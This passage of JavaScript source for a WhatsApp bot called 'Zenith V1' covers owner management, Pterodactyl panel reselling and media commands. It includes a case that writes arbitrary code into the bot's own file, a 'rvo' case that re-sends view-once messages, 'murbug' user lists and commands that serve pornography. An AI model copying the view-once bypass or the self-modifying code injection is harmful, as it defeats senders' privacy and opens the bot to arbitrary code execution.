interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© Zenith  V1"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Ken\",\"url\":\"https://wa.me/628895916513\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/Kentyzzz1\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029Vb7OMTIGJP8F10PSzM1q\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"TikTok\",\"url\":\"\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029Vb7OMTIGJP8F10PSzM1q\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await depayy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}   
break
// Case Owner
case "addowner": {
  if (!isCreator) return payreply(mess.owner)

  const q = args.join(" ")
  if (!q) 
    return payreply(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  let ceknya = await depayy.onWhatsApp(jid)
  if (!ceknya || ceknya.length === 0)
    return payreply("*Masukkan nomor WhatsApp yang valid!*")

  if (ownerbot.includes(jid))
    return payreply("*Nomor tersebut sudah menjadi owner!*")

  ownerbot.push(jid)
  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  payreply(`*Nomor ${number} berhasil ditambahkan sebagai owner!*`)
}
break

case "getcase": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./Ken.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
payreply(`${getcase(q)}`)
} catch (e) {
return payreply(`Case *${text}* tidak ditemukan`)
}
}
break

case "addcase": {
if (!isCreator) return payreply(mess.owner)

const fs = require("fs")

console.log("===== ADDCASE START =====")
console.log("Sender:", m.sender)
console.log("Query:", q)

if (!q) {
console.log("❌ Tidak ada case dikirim")
return payreply("Contoh:\n.addcase case \"halo\": {\nReply(\"Halo\")\n}\nbreak")
}

let filePath = "./Ken.js"
console.log("File handler:", filePath)

let file = fs.readFileSync(filePath, "utf8")
console.log("File berhasil dibaca")

if (file.includes(q)) {
console.log("⚠️ Case sudah ada")
return payreply("Case sudah ada")
}

let posisi = file.lastIndexOf("break")

if (posisi === -1) {
console.log("❌ break terakhir tidak ditemukan")
return payreply("Error: tidak menemukan posisi break")
}

let newCase = "\n" + q + "\n"

let newFile = file.slice(0, posisi) + newCase + file.slice(posisi)

fs.writeFileSync(filePath, newFile)

console.log("✅ Case berhasil ditambahkan")
console.log("===== ADDCASE END =====")

payreply("✅ Case berhasil ditambahkan")
}
break

case "delcase": {
if (!isCreator) return Reply(mess.owner)

const fs = require("fs")

console.log("===== DELCASE START =====")
console.log("Case yang dihapus:", q)

if (!q) return payreply("Contoh:\n.delcase halo")

let filePath = "./Ken.js"
let file = fs.readFileSync(filePath, "utf8")

let regex = new RegExp(`case\\s+"${q}"[\\s\\S]*?break`, "g")

if (!regex.test(file)) {
console.log("❌ Case tidak ditemukan")
return payreply("Case tidak ditemukan")
}

let newFile = file.replace(regex, "")

fs.writeFileSync(filePath, newFile)

console.log("✅ Case berhasil dihapus")
console.log("===== DELCASE END =====")

payreply("✅ Case berhasil dihapus")
}

case "delowner": {
  if (!isCreator) return payreply(mess.owner) 

  const q = args.join(" ")
  if (!q)
    return payreply(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  if (!ownerbot.includes(jid))
    return payreply("*Nomor tersebut bukan owner!*")

  const index = ownerbot.indexOf(jid)
  ownerbot.splice(index, 1)

  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  payreply(`*Nomor ${number} berhasil dihapus dari owner!*`)
}
break

        case 'addmurbuggc':
if (!isCreator) return 
if (!isGroup) return payreply(mess.group) 
if (!isCreator) return payreply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./database/unli.json', JSON.stringify(unli))
payreply(`Seluruh member grup kini telah menjadi murbug`)
break
case "delmurbuggc":{

if (!isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./database/unli.json", JSON.stringify(unli))
payreply(`Seluruh member grup sudah tidak lagi menjadi murbug`)
}
break

        case "addmurbug": {
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)

let nomor = args[0].replace(/[^0-9]/g, '')
let jid = nomor + "@s.whatsapp.net"

let cek = await depayy.onWhatsApp(jid)
if (!cek[0]?.exists) return payreply(`Nomor tidak terdaftar di WhatsApp!`)

let premium = JSON.parse(fs.readFileSync("./database/premium.json"))

if (premium.includes(jid)) 
return payreply(`Nomor ini sudah Murbug!`)

premium.push(jid)
fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))

payreply(`✅ Nomor ${jid} berhasil jadi Murbug`)
}
break

case 'public': { 
if (!isCreator) return payreply(mess.owner);
if (depayy.public === true) return payreply("Success To Public Mode");
depayy.public = true
payreply("Success To Public Mode");
}
break

case 'self': {
if (!isCreator) return payreply(mess.owner);
if (depayy.public === false) return payreply("Success To Self Mode");
depayy.public = false
payreply("Success To Self Mode");
}
break

case "restart": case "rst": case "restartbot": {
  
  await payreply("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await payreply("Restarting bot...")
  process.exit(0)
}
break

// Cpanel Menu
case "listadmin": {
if (!isCreator) return payreply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return payreply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await depayy.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return payreply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return payreply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/depayy/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await depayy.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================
case "deladmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return payreply("Akun admin panel tidak ditemukan!")
await payreply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================
case "delpanel": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return payreply("Server panel tidak ditemukan!")
payreply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isReseller) return payreply(mess.owner)
if (!text) return payreply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await payreply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
 *Detail Akun Panel:*  

- *ID Server:* ${server.id}  
- *Nama:* ${name}  
- *Username:* ${user.username}  
- *Password:* ${password}  
- *Login:* ${global.domain}  
- *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
- *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  

`;
await depayy.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "cadmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await payreply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await depayy.sendMessage(orang, {text: teks}, {quoted: m})
}
break

        case "addres":{
           
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await depayy.onWhatsApp(prrkek)
if (ceknya.length == 0) return payreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
premium.push(prrkek)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${prrkek} Telah Menjadi Reseller Panel`)
}
break
        case "delres":{

if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(bro)
premium.splice(unp, 1)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${bro} Telah Di Hapus Dari Reseller Panel`)
}
break

// Case Fun
// Nsfw Jir
case 'paptt': {
 if (!isCreator) return reply(mess.owner)

 const paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]

 let url = paptt[Math.floor(Math.random() * paptt.length)]

 if (url.endsWith('.mp4')) {
   await depayy.sendMessage(m.chat, {
     video: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 } else {
   await depayy.sendMessage(m.chat, {
     image: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 }
}
break

case 'manga':
case 'cum':
case 'ero':
case 'gangbang':
case 'foot':
case 'milf':
case 'pussy':
case 'yuri':
case 'zettai': {
    if (!isCreator) return payreply(mess.owner)
    try {
        const filePath = path.join(__dirname, './database/ytta', `${command}.json`);
        
        if (!fs.existsSync(filePath)) return payreply(`❌ Database ${command}.json tidak ditemukan!`);

        let rawData = fs.readFileSync(filePath);
        let images = JSON.parse(rawData);

        if (!images || images.length === 0) return reply(`❌ Database ${command} kosong.`);

        const randomImage = images[Math.floor(Math.random() * images.length)];
        const imgUrl = randomImage.url || randomImage;

        if (!imgUrl) return payreply('❌ URL tidak ditemukan.');

        await depayy.sendMessage(m.chat, {
            image: { url: imgUrl },
            caption: `📸 Random ${command} NSFW`
        }, { quoted: m }).catch(err => {
            console.error("Link mati:", err.message);
            payreply(`❌ Link gambar rusak (404). Silakan coba lagi.`);
        });

    } catch (e) {
        console.error("System Error:", e);
        psyreply('⚠️ Terjadi kesalahan sistem.');
    }
    break;
}

case "asupan":
case "18+": {
    if (!isCreator) {
        return payreply(mess.owner);
    }

    const rdrmsp = [
        "tobat bang"
    ];
    const rdmcpt = rdrmsp[Math.floor(Math.random() * rdrmsp.length)];

    await depayy.sendMessage(m.chat, {
        react: {
            text: `⏱️`,
            key: m.key
        }
    });

    payreply("Bentar bang");

    try {
        const raw = fs.readFileSync('./database/waduh.json', 'utf8');
        const json = JSON.parse(raw);

        function pickRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        const hasil = pickRandom(json.videos);

        if (typeof hasil !== 'string') {
            return payreply("🚫 Gagal ambil video, file rusak.");
        }

        await depayy.sendMessage(m.chat, {
            video: { url: hasil },
            caption: rdmcpt
        }, { quoted: m });

    } catch (err) {
        console.error("❌ Error kirim video:", err);
        return payreply("⚠️ Terjadi kesalahan saat ambil video.");
    }
}
break

case "hentaineko": {
    if (!isCreator) return payreply(mess.owner)
    try {
        const waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        if (waifudd2.data?.url) {
            await depayy.sendMessage(m.chat, {
                image: { url: waifudd2.data.url },
                caption: "Sangean lu jir jangan sampe ngocok bang🤓"
            }, { quoted: m });
        } else {
            payreply("❌ Gagal mengambil gambar hentaineko.");
        }
    } catch (error) {
        console.error("Error case hentaineko:", error);
        payreply("❌ Gagal mengambil gambar hentaineko.");
    }
}
break;

case 'nsfw': {
	if (!isCreator) return payreply(mess.owner)
        	
	payreply(`Prosess Mengambil Video NSFW `)
	sbe = await randomNsFw()
	cejd = sbe[Math.floor(Math.random(), sbe.length)]
	depayy.sendMessage(m.chat, {
	video: { url: cejd.video_1 },
	caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
	
case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await depayy.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await depayy.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await depayy.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    payreply("Udah Jing")
                } else if (caption) {
                    await depayy.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    payreply("✅️")
                } else {
                    await payreply(`Reply Media Atau Tambahkan Teks.\nExample: ${prefix + command} (Reply Image/Video/Audio) Haii Bro`);
                }
            }
            break

case "rvo": {
  if (!m.quoted) return payreply("Reply Foto/Videonya")

  const q = m.quoted
  if (!q.viewOnce)
    return payreply("Itu Bukan Pesan Sekali Lihat")

  try {
    const media = await q.download()
    const type = q.mtype === "viewOnceMessageV2"
      ? q.message.viewOnceMessageV2.message.imageMessage
        ? "image"
        : "video"
      : q.mtype.replace("Message", "")

    await depayy.sendMessage(
      m.chat,
      {
        [type]: media,
        caption: q.text || ""
      },
      { quoted: m }
    )

  } catch (err) {
    console.error(err)
    payreply("❌ Gagal Membuka View Once")
  }
}
break

case "promote": {
    if (!isGroup) return payreply(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
    
    if (!target) return payreply("❌ Tag atau reply pesan user yang mau dipromote")
    if (target === depayy.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Bot sudah admin")

    try {
        await depayy.groupParticipantsUpdate(m.chat, [target], "promote")
    } catch (e) {
        console.error(e)
        payreply("❌ Gagal melakukan promote")
    }
}
break

case "demote": {
    if (!isGroup) return payreply(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false

    if (!target) return payreply("❌ Tag atau reply pesan user yang mau didemote")
    if (target === depayy.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Gak bisa demote bot")

    try {
        await depayy.groupParticipantsUpdate(m.chat, [target], "demote")
    } catch (e) {
        console.error(e)
        payreply("❌ Gagal melakukan demote")
    }
}
break

async function tiktokDownloader(query) {
    try {
        const encodedParams = new URLSearchParams();
        encodedParams.set("url", query);
        encodedParams.set("hd", "1");

        const response = await axios({
            method: "POST",
            url: "https://tikwm.com/api/",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "current_language=en",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            data: encodedParams,
        });

        const videos = response.data.data;
        return {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music,
        };
    } catch (error) {
        throw new Error(`TikTok download failed: ${error.message}`);
    }
}

case 'tt':
case 'tiktok': {
    try {
        let args = body.trim().split(' ');
        if (!args[1]) return payreply('⚠️ Kirim link TikTok!\nContoh: .tiktok <link>');

        let urlTikTok = args[1];
        payreply('⏳ Sedang memproses video TikTok...');

        let result = await tiktokDownloader(urlTikTok);

        if (!result.no_watermark) {
            return reply('❌ Gagal mendapatkan video TikTok.');
        }

        let caption = `📥 TikTok Downloader
🎬 Title: ${result.title}
🎵 Music: ${result.music}
`;

        await depayy.sendMessage(m.chat, {
            video: { url: result.no_watermark },
            caption: caption,
            jpegThumbnail: await (await fetch(result.cover)).arrayBuffer()
        }, { quoted: m });

    } catch (error) {
        console.log(error);
        payreply('❌ Terjadi kesalahan saat memproses TikTok.');
    }
}
break;

case "brat": {
    const text = q;
    if (!text) return payreply(`*Cara Penggunaan* \n${prefix + command} Depay`);
    payreply(`𝗪𝗮𝗶𝘁...`);

    try {
        const encodedText = encodeURIComponent(text);
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}`;
        const inputPath = path.join(__dirname, "temp_image.jpg");
        const outputPath = path.join(__dirname, "sticker.webp");
        const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(inputPath, response.data);

        exec(
            `ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`,
            async (error) => {
                if (error) {
                    console.error("Gagal mengonversi gambar:", error);
                    return await payreply("Gagal membuat stiker");
                }

                await depayy.sendMessage(
                    m.chat,
                    { sticker: fs.readFileSync(outputPath) },
                    { quoted: m }
                );

                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            }
        );
    } catch (error) {
        console.error("Gagal membuat stiker:", error);
        await payreply("Gagal membuat stiker");
    }
}
break;

case "tourl": {
    if (!mime || (!mime.includes("image") && !mime.includes("video"))) {
        return payreply("kirim/reply foto atau video")
    }

    const FormData = require("form-data")
    const { ImageUploadService } = require('node-upload-images')
    
    let media = await depayy.downloadAndSaveMediaMessage(quoted) 
    let buffer = fs.readFileSync(media)
    let ext = mime.split("/")[1] || "bin"

    function randomName(length = 10) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        let result = ""
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length))
        }
        return result
    }

    let pixhostLink = "❌ Tidak support video"
    if (mime.includes("image")) {
        try {
            const service = new ImageUploadService('pixhost.to')
            let { directLink } = await service.uploadFromBinary(buffer, randomName() + "." + ext)
            pixhostLink = directLink.toString()
        } catch (e) {
            pixhostLink = "❌ Gagal upload"
        }
    }

    let catboxLink = "❌ Gagal upload"
    try {
        const catForm = new FormData()
        catForm.append("reqtype", "fileupload")
        catForm.append("fileToUpload", buffer, { filename: randomName() + "." + ext, contentType: mime })
        const catRes = await axios.post("https://catbox.moe/user/api.php", catForm, { headers: catForm.getHeaders() })
        if (typeof catRes.data === "string" && catRes.data.startsWith("http")) {
            catboxLink = catRes.data.trim()
        }
    } catch (e) {
        catboxLink = "❌ Gagal upload"
    }

    let uguuLink = "❌ Gagal upload"
    try {
        const uguuForm = new FormData()
        uguuForm.append("files[]", buffer, { filename: randomName() + "." + ext })
        const uguuRes = await axios.post("https://uguu.se/upload.php", uguuForm, { headers: uguuForm.getHeaders() })
        if (uguuRes.data?.files?.[0]?.url) {
            uguuLink = uguuRes.data.files[0].url
        }
    } catch (e) {
        uguuLink = "❌ Gagal upload"
    }

    try { fs.unlinkSync(media) } catch {}

    let teks = `✅ *UPLOAD SUCCESS*

🔗 Pixhost : ${pixhostLink}
🔗 Catbox : ${catboxLink}
🔗 Uguu : ${uguuLink}`

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: teks },
                    footer: { text: `© Zenith  V1` },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Pixhost", copy_code: pixhostLink }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Catbox", copy_code: catboxLink }) },
                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Copy Uguu", copy_code: uguuLink }) }
                        ]
                    }
                }
            }
        }
    }, { quoted: m })

    await depayy.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case "getcode": {
    const url = q;

    if (!url) {
        payreply(`⚠️ Gunakan: ${prefix}getsource <URL>`);
        return;
    }

    payreply("⏳ Sedang mengambil source code...");

    try {
        let blacklist = [];
        const blRes = await fetch("https://raw.githubusercontent.com/XyzzMoods/blacklist/refs/heads/main/blacklist.json");
        blacklist = await blRes.json();

        const hostname = (new URL(url)).hostname.toLowerCase();
        const isBlocked = blacklist.some(domain =>
            hostname === domain || hostname.endsWith("." + domain)
        );

        if (isBlocked) {
            return payreply("⚠️ Domain ini diblokir dan tidak bisa diambil source code-nya!");
        }

        const res = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(url));
        const text = await res.text();

        if (text.length > 4000) {
            await payreply("📄 Source code terlalu panjang, mengirim file...");
 
            const path = "./source.html";
            fs.writeFileSync(path, text, "utf-8");
            await depayy.sendMessage(m.chat, { document: { url: path }, fileName: "source.html" }, { quoted: m });
            fs.unlinkSync(path);
        } else {
            await payreply("📄 Source code:\n\n" + text);
        }

